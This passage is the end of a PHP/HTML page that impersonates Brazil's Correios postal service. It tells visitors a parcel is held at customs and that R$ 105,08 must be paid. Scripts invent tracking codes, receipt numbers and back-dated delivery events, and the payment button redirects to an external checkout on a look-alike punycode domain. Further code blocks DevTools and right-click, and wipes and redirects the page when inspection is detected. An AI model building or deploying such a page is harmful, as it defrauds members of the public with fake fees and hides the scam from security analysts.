                            <div class="w-2/3 text-gray-700">Valor Total:</div>
                            <div class="w-1/3 text-right text-red-600">R$ 105,08</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Timeline de eventos -->
            <div class="p-6 border-t border-gray-200 bg-gray-50">
                <h3 class="text-blue-600 text-lg font-semibold mb-4">
                    <i class="fas fa-history mr-2"></i>Histórico de Entrega
                </h3>

                <div class="space-y-4">
                    <!-- Item mais recente (destacado) -->
                    <div class="bg-white p-4 rounded-lg border-l-4 border-red-500 shadow-sm">
                        <div class="flex items-start">
                            <div class="bg-red-100 text-red-600 rounded-full p-2 mr-3">
                                <i class="fas fa-exclamation-triangle"></i>
                            </div>
                            <div class="flex-1">
                                <div class="flex justify-between items-center mb-1">
                                    <span class="font-semibold text-red-600">Pendente</span>
                                    <span class="text-sm text-gray-500 data-pendente"><?php echo $data_hoje;?></span>
                                </div>
                                <p class="text-gray-600">Centro de Distribuição: São Paulo, SP</p>
                                <p class="mt-1 text-sm text-gray-500">Seu pacote está pendente na alfândega. O pagamento é necessário para continuar.</p>
                            </div>
                        </div>
                    </div>

                    <!-- Itens antigos (normal) -->
                    <div class="bg-white p-4 rounded-lg border-l-4 border-blue-500 shadow-sm">
                        <div class="flex items-start">
                            <div class="bg-blue-100 text-blue-600 rounded-full p-2 mr-3">
                                <i class="fas fa-arrow-right"></i>
                            </div>
                            <div class="flex-1">
                                <div class="flex justify-between items-center mb-1">
                                    <span class="font-semibold">Recebido</span>
                                    <span class="text-sm text-gray-500 data-recebido-1"><?php echo $ontem2;?></span>
                                </div>
                                <p class="text-gray-600">Centro de Distribuição: São Paulo, SP</p>
                            </div>
                        </div>
                    </div>

                    <div class="bg-white p-4 rounded-lg border-l-4 border-blue-500 shadow-sm">
                        <div class="flex items-start">
                            <div class="bg-blue-100 text-blue-600 rounded-full p-2 mr-3">
                                <i class="fas fa-arrow-right"></i>
                            </div>
                            <div class="flex-1">
                                <div class="flex justify-between items-center mb-1">
                                    <span class="font-semibold">Recebido</span>
                                    <span class="text-sm text-gray-500 data-recebido-2"></span>
                                </div>
                                <p class="text-gray-600">Centro de Distribuição: Curitiba, PR</p>
                            </div>
                        </div>
                    </div>

                    <div class="bg-white p-4 rounded-lg border-l-4 border-blue-500 shadow-sm">
                        <div class="flex items-start">
                            <div class="bg-blue-100 text-blue-600 rounded-full p-2 mr-3">
                                <i class="fas fa-plane-departure"></i>
                            </div>
                            <div class="flex-1">
                                <div class="flex justify-between items-center mb-1">
                                    <span class="font-semibold">Enviado</span>
                                    <span class="text-sm text-gray-500 data-enviado"><?php echo $ontem3;?></span>
                                </div>
                                <p class="text-gray-600">Centro de Distribuição: China</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Botão de continuar -->
            <div class="p-6 bg-white border-t border-gray-200 text-center">
                <button id="continueButton" class="bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-3 px-8 rounded-full shadow-md transition duration-300 ease-in-out transform hover:scale-105">
                    <i class="fas fa-credit-card mr-2"></i>PAGAR TAXAS E CONTINUAR
                </button>
                <p class="text-sm text-gray-500 mt-2">É necessário realizar o pagamento para liberação da entrega.</p>
            </div>
        </div>
    </main>

    <footer class="bg-[#F8F8F8] border-t border-gray-200 text-[#444444] font-sans">
        <!-- Área superior do rodapé com links principais -->
        <div class="container mx-auto px-4 py-8">
            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
                <div>
                    <h4 class="text-[#00416B] font-bold text-sm uppercase mb-4 pb-1 border-b border-gray-200">Para Você</h4>
                    <ul class="text-xs space-y-2.5">
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Enviar documentos e pacotes</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Receber documentos e pacotes</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Comprar produtos</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Pagar contas</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Buscar um endereço</a></li>
                    </ul>
                </div>
                <div>
                    <h4 class="text-[#00416B] font-bold text-sm uppercase mb-4 pb-1 border-b border-gray-200">Para Seu Negócio</h4>
                    <ul class="text-xs space-y-2.5">
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Enviar documentos e pacotes</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Receber documentos e pacotes</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Logística integrada</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Certificado digital</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Marketing direto</a></li>
                    </ul>
                </div>
                <div>
                    <h4 class="text-[#00416B] font-bold text-sm uppercase mb-4 pb-1 border-b border-gray-200">Sobre Os Correios</h4>
                    <ul class="text-xs space-y-2.5">
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Institucional</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Educação e cultura</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Sustentabilidade</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Imprensa</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Patrocínios</a></li>
                    </ul>
                </div>
                <div>
                    <h4 class="text-[#00416B] font-bold text-sm uppercase mb-4 pb-1 border-b border-gray-200">Canais de Atendimento</h4>
                    <ul class="text-xs space-y-2.5">
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Fale com os Correios</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Ouvidoria</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Suporte técnico</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Agências mais próximas</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Canal Connect</a></li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- Área intermediária com ícones -->
        <div class="bg-white py-5 border-t border-b border-gray-200">
            <div class="container mx-auto px-4">
                <div class="flex flex-col md:flex-row justify-between items-center gap-6">
                    <div class="flex items-center space-x-6">
                        <a href="#" class="text-[#00416B] hover:text-[#FBBB21] transition-colors">
                            <i class="fab fa-facebook-square text-2xl"></i>
                        </a>
                        <a href="#" class="text-[#00416B] hover:text-[#FBBB21] transition-colors">
                            <i class="fab fa-instagram text-2xl"></i>
                        </a>
                        <a href="#" class="text-[#00416B] hover:text-[#FBBB21] transition-colors">
                            <i class="fab fa-youtube text-2xl"></i>
                        </a>
                        <a href="#" class="text-[#00416B] hover:text-[#FBBB21] transition-colors">
                            <i class="fab fa-linkedin text-2xl"></i>
                        </a>
                        <a href="#" class="text-[#00416B] hover:text-[#FBBB21] transition-colors">
                            <i class="fab fa-twitter-square text-2xl"></i>
                        </a>
                    </div>
                    <div>
                        <img src="./assets/img6.png" alt="Logo Correios" class="h-10 w-auto" onerror="this.src='./assets/img6.png'; this.onerror=null;">
                    </div>
                </div>
            </div>
        </div>

        <!-- Área inferior com informações legais -->
        <div class="bg-[#F8F8F8] py-5">
            <div class="container mx-auto px-4 text-xs text-[#666666]">
                <div class="flex flex-col md:flex-row justify-between items-center gap-4">
                    <div>
                        <p>© Copyright 2025 Correios - Todos os direitos reservados</p>
                    </div>
                    <div class="flex flex-wrap gap-6 justify-center md:justify-end">
                        <a href="#" class="hover:text-[#00416B] hover:underline transition-colors">Política de Privacidade</a>
                        <a href="#" class="hover:text-[#00416B] hover:underline transition-colors">Termos de Uso</a>
                        <a href="#" class="hover:text-[#00416B] hover:underline transition-colors">Mapa do Site</a>
                        <a href="#" class="hover:text-[#00416B] hover:underline transition-colors">Acessibilidade</a>
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <!-- Redireciona para checkout.php quando botão com id continueButton for clicado -->
    <script>
        document.getElementById("continueButton").addEventListener("click", function() {
            window.location.href = "https://checkout.xn--reviso-7ta.store/VCCL1O8SC38I";
        });
    </script>

    <!-- Anima o título da aba com efeito "marquee" usando texto do elemento com id titulo-animado -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const titulo = document.getElementById('titulo-animado');
            const textoOriginal = titulo.textContent;
            // Velocidade declarada, mas não usada (pode remover ou usar)
            const velocidade = 15000;

            function animarTitulo() {
                document.title = textoOriginal;
                let posicao = 0;
                let direcao = 1;

                setInterval(function() {
                    if (posicao > textoOriginal.length) {
                        direcao = -1;
                    } else if (posicao <= 0) {
                        direcao = 1;
                    }

                    posicao += direcao;

                    if (direcao === 1) {
                        // Movendo da direita para a esquerda
                        document.title = textoOriginal.substring(posicao) + " • " + textoOriginal.substring(0, posicao);
                    } else {
                        // Movendo da esquerda para a direita
                        document.title = textoOriginal.substring(textoOriginal.length - posicao) + " • " + textoOriginal.substring(0, textoOriginal.length - posicao);
                    }
                }, 200);
            }

            animarTitulo();
        });
    </script>

    <!-- Script de acessibilidade do VLibras -->
    <script src="./assets/vlibras-plugin.js.download"></script>
    <script>
        new window.VLibras.Widget('https://vlibras.gov.br/app');
    </script>

    <!-- Atualiza a data e hora de São Paulo a cada segundo -->
    <script>
        function atualizarHoraSP() {
            const agora = new Date();
            const formatter = new Intl.DateTimeFormat('pt-BR', {
                timeZone: 'America/Sao_Paulo',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                hour12: false
            });
            const dataFormatada = formatter.format(agora).replace(',', '');
            document.getElementById('data-hora').textContent = dataFormatada;
        }

        setInterval(atualizarHoraSP, 1000); // Atualiza todo segundo
        atualizarHoraSP(); // Atualiza logo no carregamento
    </script>

    <!-- Gera um código de rastreio aleatório no formato esperado -->
    <script>
        function gerarCodigoRastreio() {
            const prefixos = ["BR", "AA", "AB", "CD", "EF"];
            const sufixos = ["BR", "BR", "BR"];

            const prefixo = prefixos[Math.floor(Math.random() * prefixos.length)];
            const sufixo = sufixos[Math.floor(Math.random() * sufixos.length)];

            let numeros = '';
            for (let i = 0; i < 9; i++) {
                numeros += Math.floor(Math.random() * 10);
            }

            return `${prefixo}${numeros}${sufixo}`;
        }

        document.getElementById('codigo-rastreio').textContent = gerarCodigoRastreio();
    </script>

    <!-- Gera um número de comprovante aleatório e preenche elemento com id comprovante -->
    <script>
        function gerarComprovante() {
            const gerarBloco = () => {
                return Math.floor((1 + Math.random()) * 0x10000)
                    .toString(16)
                    .toUpperCase()
                    .padStart(4, '0');
            };

            return `${gerarBloco()}.${gerarBloco()}.${gerarBloco()}.${gerarBloco()}`;
        }

        document.getElementById('comprovante').textContent = gerarComprovante();
    </script>

    <!-- Atualiza várias datas no formato dd/mm/aaaa em elementos com classes específicas -->
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            function formatarData(data) {
                const dia = data.getDate().toString().padStart(2, '0');
                const mes = (data.getMonth() + 1).toString().padStart(2, '0');
                const ano = data.getFullYear();
                return `${dia}/${mes}/${ano}`;
            }

            const hoje = new Date();

            const datas = {
                ".data-pendente": new Date(hoje.getTime() - 1 * 86400000), // ontem
                ".data-recebido-1": new Date(hoje.getTime() - 3 * 86400000), // -3 dias
                ".data-recebido-2": new Date(hoje.getTime() - 4 * 86400000), // -4 dias
                ".data-enviado": new Date(hoje.getTime() - 5 * 86400000), // -5 dias
            };

            for (const seletor in datas) {
                const el = document.querySelector(seletor);
                if (el) el.textContent = formatarData(datas[seletor]);
            }
        });
    </script>

    <!-- Proteção contra ferramentas de desenvolvedor (DevTools) no desktop -->
    <script>
        const isMobile = /iphone|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase());

        if (!isMobile) {
            // 1. Bloqueia teclas: F12, Ctrl+Shift+I/J/C e Ctrl+U (atalhos DevTools e ver código-fonte)
            document.addEventListener('keydown', function(e) {
                if (
                    e.key === 'F12' ||
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
                    (e.ctrlKey && e.key === 'U')
                ) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            });

            // 2. Bloqueia clique direito (menu de contexto)
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });

            // 3. Detecta DevTools pela tentativa de acesso a propriedade customizada no console.log
            (function() {
                const detectDevTools = () => {
                    const el = new Image();
                    Object.defineProperty(el, 'id', {
                        get: function() {
                            document.body.innerHTML = '';
                            window.location.href = 'https://google.com';
                        }
                    });
                    console.log(el);
                };
                setInterval(detectDevTools, 1000);
            })();

            // 4. Detecta DevTools pelo tamanho da janela (quando aberta, muda dimensões)
            (function() {
                let devtoolsOpen = false;
                setInterval(() => {
                    const threshold = 160;
                    if (
                        window.outerHeight - window.innerHeight > threshold ||
                        window.outerWidth - window.innerWidth > threshold
                    ) {
                        if (!devtoolsOpen) {
                            devtoolsOpen = true;
                            document.body.innerHTML = '';
                            window.location.href = 'https://google.com';
                        }
                    } else {
                        devtoolsOpen = false;
                    }
                }, 500);
            })();
        }
    </script>

    <!-- Script do SavePage ShadowLoader (provavelmente de plugin ou biblioteca externa) -->
    <script id="savepage-shadowloader" type="text/javascript">
        "use strict";
        window.addEventListener("DOMContentLoaded",
            function(event) {
                savepage_ShadowLoader(5);
            }, false);

        function savepage_ShadowLoader(c) {
            createShadowDOMs(0, document.documentElement);

            function createShadowDOMs(a, b) {
                var i;
                if (b.localName == "iframe" || b.localName == "frame") {
                    if (a < c) {
                        try {
                            if (b.contentDocument.documentElement != null) {
                                createShadowDOMs(a + 1, b.contentDocument.documentElement)
                            }
                        } catch (e) {}
                    }
                } else {
                    if (b.children.length >= 1 && b.children[0].localName == "template" && b.children[0].hasAttribute("data-savepage-shadowroot")) {
                        b.attachShadow({
                            mode: "open"
                        }).appendChild(b.children[0].content);
                        b.removeChild(b.children[0]);
                        for (i = 0; i < b.shadowRoot.children.length; i++)
                            if (b.shadowRoot.children[i] != null) createShadowDOMs(a, b.shadowRoot.children[i])
                    }
                    for (i = 0; i < b.children.length; i++)
                        if (b.children[i] != null) createShadowDOMs(a, b.children[i])
                }
            }
        }
    </script>

    <!-- Script para controlar menu de acessibilidade e alto contraste -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const botaoAcessibilidade = document.getElementById('botao-acessibilidade');
            const listaItens = document.getElementById('lista-itens-acessibilidade');

            botaoAcessibilidade.addEventListener('click', function() {
                if (listaItens.style.display === 'none' || listaItens.style.display === '') {
                    listaItens.style.display = 'block';
                } else {
                    listaItens.style.display = 'none';
                }
            });

            // Fecha o menu ao clicar fora dele
            document.addEventListener('click', function(event) {
                if (!event.target.closest('.acessibilidade')) {
                    listaItens.style.display = 'none';
                }
            });

            // Alterna alto contraste
            const linkContraste = document.getElementById('link-contraste');
            linkContraste.addEventListener('click', function(e) {
                e.preventDefault();
                document.body.classList.toggle('alto-contraste');
            });
        });
    </script>



</body>

</html>